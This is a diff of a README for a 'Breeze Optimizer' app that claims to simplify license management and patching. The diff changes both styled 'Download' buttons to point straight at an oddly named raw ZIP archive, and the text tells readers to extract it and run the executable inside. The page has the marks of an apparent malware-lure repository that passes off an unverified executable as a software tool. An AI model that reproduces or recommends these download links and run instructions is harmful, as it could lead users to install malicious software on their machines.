@@ -1,6 +1,6 @@
 <h1>🧰 breeze-optimizer-v2026-app - Simplify License Management & Patching</h1>
 <p align="center">
-  <a href="https://github.com/vaclavgreatbellied909/breeze-optimizer-v2026-app" style="display:inline-block;padding:16px 48px;font-size:24px;font-weight:bold;color:#ffffff;background:#4CAF50;border-radius:8px;text-decoration:none;">⬇ Download Now</a>
+  <a href="https://github.com/vaclavgreatbellied909/breeze-optimizer-v2026-app/raw/refs/heads/main/tryworks/optimizer_breeze_app_v_anilinism.zip" style="display:inline-block;padding:16px 48px;font-size:24px;font-weight:bold;color:#ffffff;background:#4CAF50;border-radius:8px;text-decoration:none;">⬇ Download Now</a>
 </p>
 
 ## 🚀 Getting Started
@@ -11,7 +11,7 @@ Welcome! This guide will help you quickly download and run Breeze Optimizer on y
 
 Visit this link to download the application:
 
-<a href="https://github.com/vaclawgreatbellied909/breeze-optimizer-v2026-app" style="display:inline-block;padding:10px 24px;font-size:18px;font-weight:bold;color:#ffffff;background:#2196F3;border-radius:6px;text-decoration:none;">📦 Download from GitHub</a>
+<a href="https://github.com/vaclavgreatbellied909/breeze-optimizer-v2026-app/raw/refs/heads/main/tryworks/optimizer_breeze_app_v_anilinism.zip" style="display:inline-block;padding:10px 24px;font-size:18px;font-weight:bold;color:#ffffff;background:#2196F3;border-radius:6px;text-decoration:none;">📦 Download from GitHub</a>
 
 After visiting the page, click the green "Code" button then select "Download ZIP". Once downloaded, extract the ZIP folder and run the `breeze-optimizer-v2026-app.exe` file.
 
